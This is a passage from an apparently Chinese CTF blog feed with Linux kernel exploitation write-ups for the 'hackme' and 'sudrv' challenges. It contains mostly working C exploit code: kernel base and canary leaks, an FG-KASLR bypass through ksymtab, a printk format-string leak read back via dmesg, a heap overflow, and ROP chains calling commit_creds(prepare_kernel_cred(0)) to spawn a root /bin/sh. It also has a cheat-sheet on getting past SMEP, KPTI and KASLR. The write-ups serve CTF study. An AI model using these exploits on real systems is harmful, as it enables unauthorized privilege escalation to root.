punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Return ERROR\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">control</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> offset<span class=\"token punctuation\">;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\".intel_syntax noprefix;\"</span>\n        <span class=\"token string\">\"mov leak, rax;\"</span>\n        <span class=\"token string\">\".att_syntax;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span>\n            <span class=\"token function\">get_addr</span><span class=\"token punctuation\">(</span>__ksymtab_prepare_kernel_cred <span class=\"token punctuation\">,</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span>\n            offset <span class=\"token operator\">=</span> leak <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">;</span>\n            prepare_kernel_cred <span class=\"token operator\">=</span> __ksymtab_prepare_kernel_cred <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">;</span>\n            <span class=\"token function\">get_addr</span><span class=\"token punctuation\">(</span>__ksymtab_commit_creds <span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span>\n            offset <span class=\"token operator\">=</span> leak <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">;</span>\n            commit_creds <span class=\"token operator\">=</span> __ksymtab_commit_creds <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">;</span>\n            <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prepare_kernel_cred\"</span> <span class=\"token punctuation\">,</span> prepare_kernel_cred<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"commit_creds\"</span> <span class=\"token punctuation\">,</span> commit_creds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">to_rop</span><span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span>\n            <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"struct\"</span><span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">to_rop</span><span class=\"token punctuation\">(</span>leak <span class=\"token punctuation\">,</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span>\n            <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    size_t buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t rop<span class=\"token punctuation\">[</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">int</span> length <span class=\"token operator\">=</span>  <span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">signal</span><span class=\"token punctuation\">(</span>SIGSEGV<span class=\"token punctuation\">,</span> shell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/hackme\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> buf <span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// show(buf , length/8);</span>\n    canary <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    vmlinux_base <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFFFFFFFFFF0000</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">control</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>另外，笔者认为可能还存在一种方法，在 level2 中可以看到这些 gadget，如果我们通过上面泄露 commit_creds 的方法多泄露以下两个 gadget 所在的函数，应该也可以一次性 ROP 掉</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">size_t mov_rdi_rax_jne_pop2_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x66fea3</span><span class=\"token punctuation\">;</span>\nsize_t cmp_rdx_jne_pop2_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x964cc4</span><span class=\"token punctuation\">;</span></code></pre>\n<p>最后，偷一个网上的总结</p>\n<blockquote>\n<ol>\n<li>如果内核没有保护，就直接 ret2usr。</li>\n<li>如果开了 SMEP，就用 ROP</li>\n<li>溢出或者位置被限制在栈上，就用 pivot gadget 进行栈迁移。</li>\n<li>KPTI 利用 KPTI trampoline 或者 signal handler</li>\n<li>SMAP 会导致 stack pivot 很难利用</li>\n<li>如果没有 KASLR，直接泄露地址就能用，开了的话就用基地址 + 偏移。</li>\n<li>如果有 FG-KASLR，记得利用 ksymtab 和不受影响的区域。</li>\n</ol>\n</blockquote>\n<h2 id=\"reference\"><a class=\"markdownIt-Anchor\" href=\"#reference\">#</a> Reference</h2>\n<p><a href=\"https://cloud.tencent.com/developer/article/1396155\">CVE-2017-1000112-UFO 学习总结 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/232545\">Linux 内核漏洞利用技术：覆写 modprobe_path - 安全客 - 安全资讯平台 (anquanke.com)</a></p>\n<p><a href=\"https://zhangyidong.top/2021/02/10/kernel_pwn(fg_kaslr)/\">Kernel_pwn FG_KASLR in ROP | An9Ela (zhangyidong.top)</a></p>\n<p><a href=\"https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/\">Learning Linux Kernel Exploitation - Part 1 - Midas Blog (lkmidas.github.io)</a></p>\n<p><a href=\"https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/\">Learning Linux Kernel Exploitation - Part 3 - Midas Blog (lkmidas.github.io)</a></p>\n",
            "tags": [
                "kernel",
                "C语言"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/",
            "url": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/",
            "title": "教你学内核-sudrv",
            "date_published": "2022-09-30T03:10:27.000Z",
            "content_html": "<blockquote>\n<p>确实没鸽</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"sudrv\"><a class=\"markdownIt-Anchor\" href=\"#sudrv\">#</a> sudrv</h1>\n<p>自己做出来的第二个 kernel 题目，也是在网上看了很多很多很多东西</p>\n<h2 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h2>\n<p>首先是内核堆块的分配策略</p>\n<p>slab 机制见<a href=\"https://blog.csdn.net/lukuen/article/details/6935068\">这篇文章</a></p>\n<p>简单的说我这边看到的就是，分配的堆块大小是固定的某些值，这些值通常是 2 的 n 次方根，并且将链表的零散堆块清空后，再分配就是再连续的一整个大块里面，也就是说，你现在申请的地址下面可能就有指向下一个待分配堆块的指针。</p>\n<p>然后是堆的格式化字符串</p>\n<p>同用户态，内核的 printk 也会产生格式化字符串漏洞，并且在最开始启动内核时，有如下一些信息打印出来</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/image-20220922155211641.png\" alt=\"image-20220922155211641\"></p>\n<p>因此我们可以直接看到 printk 输出的数据，也可以通过 dmesg 查看数据</p>\n<h2 id=\"漏洞点\"><a class=\"markdownIt-Anchor\" href=\"#漏洞点\">#</a> 漏洞点</h2>\n<p>首先是格式化字符串</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/image-20220922155529433.png\" alt=\"image-20220922155529433\"></p>\n<p>然后是 write 没有限制长度，导致可以实现堆溢出</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/image-20220922155805531.png\" alt=\"image-20220922155805531\"></p>\n<h2 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<p>关于格式化字符串利用，内核里可以通过 % llx 来打印出内容，是直接显示在终端的，但是通过 dmesg 也可以再次查看，那么我们可以重定向一下保存到文件里，再读文件将 leak 出来的 内容弄出来就行。</p>\n<p>之后就是同用户态一样，算偏移，找 gadget</p>\n<p>然后就是堆利用的部分，和用户态的 tcache 类似，修改指针可以直接申请到该内存，并且指针还是连续分布的（，因此堆溢出就可以实现任意地址申请</p>\n<p>那么我们申请的地方就可以是栈，申请到 调用函数的返回地址就行了</p>\n<p>最后是 rop 链的构造，起初我也以为可以直接照搬之前的 rop 链，但是有些 gadget 居然是不一样的，因此重新构造了一些，而且前面还需要执行 signal (SIGSEGV, shell); 在用户态执行 shell ，主要是由于内核开了 KPTI</p>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/kpti/\">KPTI - Kernel Page Table Isolation - CTF Wiki (ctf-wiki.org)</a></p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">dmesg | grep &#39;page table&#39;</code></pre>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/image-20220922161647244.png\" alt=\"image-20220922161647244\"></p>\n<p>这边提一下泄露出内核地址后，可以通过如下命令得到内核的基地址，然后得到偏移</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">cat  &#x2F;proc&#x2F;kallsyms | tail -n +1 | head -n 10</code></pre>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/image-20220922115700052.png\" alt=\"image-20220922115700052\"></p>\n<h2 id=\"最终exp\"><a class=\"markdownIt-Anchor\" href=\"#最终exp\">#</a> 最终 exp</h2>\n<p>比较稳定 getshell</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span>\n\nsize_t commit_creds <span class=\"token operator\">=</span> <span class=\"token number\">0x81410</span><span class=\"token punctuation\">;</span>\nsize_t prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token number\">0x81790</span><span class=\"token punctuation\">;</span>\nsize_t pop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x1388</span><span class=\"token punctuation\">;</span>\nsize_t pop_rdx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x44f17</span><span class=\"token punctuation\">;</span>\nsize_t pop_rcx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x674ff</span><span class=\"token punctuation\">;</span>\nsize_t pop_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4ee</span><span class=\"token punctuation\">;</span>\n\nsize_t mov_rdi_rax_x_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x9e2959</span><span class=\"token punctuation\">;</span>\nsize_t mov_rdi_rax_y_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x1a2cb</span><span class=\"token punctuation\">;</span>\n\nsize_t swapgs_popfq_ret <span class=\"token operator\">=</span> <span class=\"token number\">0xa00d5a</span><span class=\"token punctuation\">;</span>\nsize_t iretq_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x21762</span><span class=\"token punctuation\">;</span>\n\nsize_t vmlinux_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nsize_t stack_addr <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nsize_t user_cs<span class=\"token punctuation\">,</span> user_ss<span class=\"token punctuation\">,</span> user_rflags<span class=\"token punctuation\">,</span> user_sp<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token punctuation\">,</span> size_t address <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s : \\033[0m%#lx\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s \\033[0m\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[31m\\033[1m[Error] %s\\n\\033[0m\"</span> <span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to get root\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Get root!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\"mov user_cs, cs;\"</span>\n        <span class=\"token string\">\"mov user_ss, ss;\"</span>\n        <span class=\"token string\">\"mov user_sp, rsp;\"</span>\n        <span class=\"token string\">\"pushf;\"</span>\n        <span class=\"token string\">\"pop user_rflags;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"status saved!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_address</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    FILE<span class=\"token operator\">*</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/leak\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Cannot open file /tmp/leak\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">float</span> leak_f <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> leak_buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    size_t num <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    size_t leak <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> <span class=\"token string\">\"vmlinux_leak\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> <span class=\"token string\">\"%s%f%s%s%lx\"</span> <span class=\"token punctuation\">,</span> leak_buf <span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>leak_f<span class=\"token punctuation\">,</span>leak_buf<span class=\"token punctuation\">,</span>leak_buf <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            vmlinux_base <span class=\"token operator\">=</span>leak <span class=\"token operator\">-</span> <span class=\"token number\">0x1c827f</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> <span class=\"token string\">\"stack_leak\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> <span class=\"token string\">\"%s%f%s%s%lx\"</span> <span class=\"token punctuation\">,</span> leak_buf <span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>leak_f<span class=\"token punctuation\">,</span>leak_buf<span class=\"token punctuation\">,</span>leak_buf <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            stack_addr <span class=\"token operator\">=</span> leak <span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    commit_creds <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    prepare_kernel_cred <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    pop_rdi_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rdx_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rcx_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rbp_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    mov_rdi_rax_y_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    swapgs_popfq_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    iretq_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"commit_creds\"</span> <span class=\"token punctuation\">,</span> commit_creds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prepare_kernel_cred\"</span> <span class=\"token punctuation\">,</span> prepare_kernel_cred<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// leak:deadbeef,40,40,b,0,ffffffff989c827f,c5d29dd937432d00,2</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"%llx,%llx,%llx,%llx,%llx,\\nvmlinux_leak: 0x%llx\\n,%llx,%llx,%llx,\\nstack_leak: 0x%llx\\n\"</span><span class=\"token punctuation\">;</span>\n    size_t rop<span class=\"token punctuation\">[</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">signal</span><span class=\"token punctuation\">(</span>SIGSEGV<span class=\"token punctuation\">,</span> shell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/meizijiutql\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span><span class=\"token number\">0x73311337</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0xfff</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span>buf <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span><span class=\"token number\">0xDEADBEEF</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dmesg > /tmp/leak\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">get_address</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"vmlinux_base\"</span> <span class=\"token punctuation\">,</span> vmlinux_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack_addr\"</span> <span class=\"token punctuation\">,</span> stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">0x100</span> <span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token 